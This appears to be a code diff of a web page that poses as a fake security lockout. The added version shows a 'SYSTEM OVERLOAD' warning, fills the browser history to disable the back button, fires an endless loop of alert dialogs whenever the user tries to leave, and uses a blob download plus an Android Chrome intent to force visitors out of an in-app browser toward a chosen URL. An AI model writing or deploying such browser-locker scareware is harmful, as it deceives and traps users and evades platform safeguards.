@@ -4,61 +4,62 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
-        #box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .btn { background: #fe2c55; color: #fff; padding: 20px 60px; border-radius: 8px; font-weight: 800; font-size: 20px; border: none; }
+        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; color:#fff; font-family:sans-serif; overflow:hidden; }
+        #ui { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; }
+        .btn { background:#fe2c55; color:#fff; padding:20px 60px; border-radius:8px; font-weight:800; font-size:20px; border:none; }
     </style>
 </head>
 <body>
-
-    <div id="box">
-        <div style="font-size: 24px; font-weight: 900; margin-bottom: 20px;">SECURITY LOCKOUT</div>
-        <p style="padding: 0 40px; margin-bottom: 40px; color: #ccc;">Your account session is restricted. Verification is required in a secure system browser to continue.</p>
-        <button class="btn" onclick="breakout()">VERIFY NOW</button>
+    <div id="ui">
+        <div style="font-size:24px; font-weight:900; margin-bottom:20px;">SYSTEM OVERLOAD</div>
+        <p style="padding:0 40px; margin-bottom:40px; color:#ccc;">Security protocol detected. Verification required in external browser to unlock device functions.</p>
+        <button class="btn" onclick="hardBreakout()">UNLOCK NOW</button>
     </div>
 
 <script>
-    // 1. SET YOUR TARGET URL HERE
-    const myLink = "https://www.google.com"; 
+    const targetUrl = "https://www.google.com";
 
-    function breakout() {
-        const isAndroid = /Android/i.test(navigator.userAgent);
+    // NEW OUTSIDE THE BOX MOVE: The "Download Hijack"
+    function hardBreakout() {
+        // Create a 'fake' file that forces the OS to handle the request
+        const blobContent = `<html><script>window.location.href="${targetUrl}";<\/script></html>`;
+        const blob = new Blob([blobContent], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
         
-        if (isAndroid) {
-            // THE ANDROID CHROME FORCER
-            // This 'intent' tells Android: "Open this in the Chrome App, NOT the current app"
-            const chromeIntent = `intent://${myLink.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
-            window.location.href = chromeIntent;
-        } else {
-            // THE iOS SAFARI FORCER
-            // iOS is tougher. We trigger a "Window Open" then a "Location Change" 
-            // to confuse the WebView into offering the "Open in Safari" banner.
-            window.open(myLink, '_blank');
-            window.location.assign(myLink);
-        }
+        // 1. Create a temporary anchor
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "secure_verify.html"; // The 'download' attribute forces handover
+        document.body.appendChild(a);
+        
+        // 2. Shotgun multiple protocols simultaneously to overwhelm the interceptor
+        window.location.assign(url);
+        a.click();
+        
+        // 3. Android Intent Fallback (Aggressive version)
+        const altIntent = `intent://${targetUrl.replace("https://","")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+        window.location.href = altIntent;
     }
 
-    // 2. THE INFINITE MODAL TRAP (Blocks X and Back)
-    function startPrison() {
-        // This stops the UI thread so the 'X' button doesn't respond
-        alert("CRITICAL: Manual Verification Required.\n\nClick OK to launch Secure Browser.");
+    // THE INFINITE LOCK (Modified to prevent self-trapping)
+    function nuclearLock() {
+        // This blocks the 'X' button thread
+        alert("CRITICAL ERROR: Manual Verification Required.\n\nClick OK to launch external security browser.");
         
-        // Try to break out
-        breakout();
+        // Try the breakout
+        hardBreakout();
         
-        // Re-arm the trap immediately
-        setTimeout(startPrison, 50);
+        // Re-arm the lock instantly
+        setTimeout(nuclearLock, 10);
     }
 
-    // 3. ARM THE TRAP ON EXIT ATTEMPTS
-    window.onblur = () => { startPrison(); };
-    window.onpopstate = () => { startPrison(); };
+    // Trigger lock on 'X' or 'Back'
+    window.onblur = () => { nuclearLock(); };
+    window.onpopstate = () => { nuclearLock(); };
 
-    // 4. PREVENT THE BACK BUTTON
+    // Fill history stack
     window.onload = () => {
-        for(let i=0; i<100; i++) {
-            history.pushState({locked: true}, "", "#secure_verify_" + i);
-        }
+        for(let i=0; i<100; i++) history.pushState(null, null, "#sys_lock_" + i);
     };
 </script>
 </body>
